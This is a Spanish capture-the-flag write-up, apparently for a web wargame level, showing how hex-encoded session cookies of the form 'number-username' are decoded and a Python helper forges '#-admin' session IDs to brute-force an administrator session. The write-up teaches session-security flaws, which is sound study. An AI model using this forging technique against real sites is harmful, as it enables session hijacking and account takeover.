Este nivel presenta un registro de usuario similar al del nivel anterior, aunque en esta ocasión no se muestra el código fuente y aparece el mensaje `This page uses mostly the same code as the previous level, but session IDs are no longer sequential`. 

Al registrarnos, podemos observar el ID de la sesión en el inspector de cookies:
```
3135352d4f7264656e6d6f726961
```

Eliminando la cookie para generar una nueva con distintos usuarios, obtenemos la siguiente lista de IDs:
```
3135352d4f7264656e6d6f726961
3335352d497473416d654d6172696f
3436342d41646d696e46724e6f436170
```

Con un mismo nombre de usuario, obtenemos la siguiente lista:
```
3438322d4f7264656e6d6f726961
3534382d4f7264656e6d6f726961
3531302d4f7264656e6d6f726961
```

De esto inferimos que el nombre de usuario se utiliza para codificar el ID de sesión. Al analizar los caracteres de las cookies, observamos que van de 0 - f, lo que indica que la codificación es hexadecimal. Usando [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MzEzNTM1MmQ0ZjcyNjQ2NTZlNmQ2ZjcyNjk2MQozMzM1MzUyZDQ5NzQ3MzQxNmQ2NTRkNjE3MjY5NmYKMzQzNjM0MmQ0MTY0NmQ2OTZlNDY3MjRlNmY0MzYxNzAKMzQzODMyMmQ0ZjcyNjQ2NTZlNmQ2ZjcyNjk2MQozNTM0MzgyZDRmNzI2NDY1NmU2ZDZmNzI2OTYxCjM1MzEzMDJkNGY3MjY0NjU2ZTZkNmY3MjY5NjE) convertimos las IDs a UTF-8, obteniendo las siguientes cadenas:

* Diferentes Usuarios
```
	155-Ordenmoria
	355-ItsAmeMario
	464-AdminFrNoCap
```
* Mismo Usuario:
```
	482-Ordenmoria
	548-Ordenmoria
	510-Ordenmoria
```

Conociendo el formato de las IDs y observando que el rango de 640 IDs del nivel anterior se mantiene, podemos generar IDs de administrador con el formato `#-admin` codificándolas a Hexadecimal. 
```python
def build_admin_session(session_ID):  
    session= str(session_ID) + "-admin"  
    return session.encode('utf-8').hex()
```

Esto nos permite automatizar la búsqueda mediante un [script](), iterando sobre el rango de sesiones hasta encontrar una con privilegios de administrador.

---
## **Conclusión**
 
Los IDs de sesión pueden ser explotados cuando su generación se basa en datos predecibles, por lo que es importante evitar usar esta información en los IDs, además de implementar mecanismos robustos para la gestión de sesiones, como el uso de generadores criptográficamente seguros

---
-,"  
[_P